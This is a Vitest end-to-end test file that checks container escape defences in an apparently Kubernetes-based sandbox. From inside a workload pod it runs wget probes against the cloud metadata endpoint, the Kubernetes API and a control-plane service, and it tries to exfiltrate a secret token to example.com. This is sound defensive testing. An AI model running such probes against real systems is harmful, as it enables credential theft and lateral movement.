import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import {
  RECIPE_NAMESPACE,
  SANDBOX_NAMESPACE,
  kubectl,
  kubectlJson,
  sleep,
  waitForPodReady,
  waitForResource,
} from './helpers'

const SECRET_NAME = 'escape-probe-env'
const RECIPE_NAME = 'escape-probe-recipe'
const WORKLOAD_ID = 'escape-probe'

function shellSingleQuote(value: string): string {
  return `'${value.replace(/'/g, `'\"'\"'`)}'`
}

function cleanupRecipe(): void {
  try {
    kubectl(
      `delete workflowrecipe ${RECIPE_NAME} -n ${RECIPE_NAMESPACE} --ignore-not-found --timeout=30s`
    )
  } catch {
    /* ignore */
  }
}

function cleanupSecret(): void {
  try {
    kubectl(`delete secret ${SECRET_NAME} -n ${SANDBOX_NAMESPACE} --ignore-not-found --timeout=30s`)
  } catch {
    /* ignore */
  }
}

function getPodName(): string {
  return kubectl(
    `get pod -l clerum.io/recipe=${RECIPE_NAME},clerum.io/workload=${WORKLOAD_ID} -n ${SANDBOX_NAMESPACE} -o jsonpath='{.items[0].metadata.name}'`
  )
}

function execInPod(command: string): string {
  const pod = getPodName()
  const wrapped = `${command} 2>&1 || true`
  return kubectl(`exec -n ${SANDBOX_NAMESPACE} ${pod} -- sh -lc ${shellSingleQuote(wrapped)}`)
}

beforeAll(async () => {
  cleanupRecipe()
  cleanupSecret()

  kubectl(
    `create secret generic ${SECRET_NAME} -n ${SANDBOX_NAMESPACE} --from-literal=api-token=super-secret-probe-token`
  )

  kubectl(`apply -f - <<'EOF'
apiVersion: clerum.io/v1alpha1
kind: WorkflowRecipe
metadata:
  name: ${RECIPE_NAME}
  namespace: ${RECIPE_NAMESPACE}
spec:
  contextRef: default
  workloads:
    - id: ${WORKLOAD_ID}
      type: deployment
      image: clerum/mock-mcp-server:test
      command:
        - sh
        - -lc
      args:
        - sleep 300
      security:
        runAsUser: 1001
        runAsGroup: 1001
        fsGroup: 1001
      envSecret:
        name: ${SECRET_NAME}
        keys:
          - secretKey: api-token
            envVar: API_TOKEN
  security:
    isolationLevel: strict
EOF`)

  await waitForResource(`deploy -l clerum.io/recipe=${RECIPE_NAME}`, SANDBOX_NAMESPACE, {
    timeoutMs: 60_000,
  })
  await waitForPodReady(
    `clerum.io/recipe=${RECIPE_NAME},clerum.io/workload=${WORKLOAD_ID}`,
    SANDBOX_NAMESPACE,
    90_000
  )
  await sleep(3_000)
})

afterAll(() => {
  cleanupRecipe()
  cleanupSecret()
})

describe('Escape probes E2E', () => {
  it('disables service account token mounts for strict sandbox workloads', () => {
    const pod = kubectlJson<{
      spec?: { automountServiceAccountToken?: boolean }
    }>(`get pod ${getPodName()} -n ${SANDBOX_NAMESPACE}`)

    expect(pod.spec?.automountServiceAccountToken).toBe(false)

    const tokenCheck = execInPod(
      'if [ -e /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo PRESENT; else echo ABSENT; fi'
    )
    expect(tokenCheck).toContain('ABSENT')
  })

  it('blocks metadata and Kubernetes API probes from the workload pod', () => {
    const metadataResult = execInPod(
      'wget -qO- --timeout=3 http://169.254.169.254/latest/meta-data || echo BLOCKED'
    )
    expect(metadataResult).toMatch(/BLOCKED|timed out|refused|No route|unreachable/i)

    const k8sApiResult = execInPod(
      'wget -qO- --no-check-certificate --timeout=3 https://kubernetes.default.svc.cluster.local || echo BLOCKED'
    )
    expect(k8sApiResult).toMatch(/BLOCKED|timed out|refused|No route|unreachable|bad address/i)
  })

  it('blocks lateral movement to control-plane services and outbound secret exfiltration', () => {
    const controlApiResult = execInPod(
      'wget -qO- --timeout=3 http://control-api.control-plane.svc.cluster.local:8090/health || echo BLOCKED'
    )
    expect(controlApiResult).toMatch(/BLOCKED|timed out|refused|No route|unreachable|bad address/i)

    const exfilResult = execInPod(
      'if [ -n "$API_TOKEN" ]; then wget -qO- --timeout=3 "https://example.com/?token=$API_TOKEN" || echo BLOCKED; else echo MISSING_SECRET; fi'
    )
    expect(exfilResult).not.toContain('MISSING_SECRET')
    expect(exfilResult).toMatch(/BLOCKED|timed out|refused|No route|unreachable|bad address/i)
  })
})
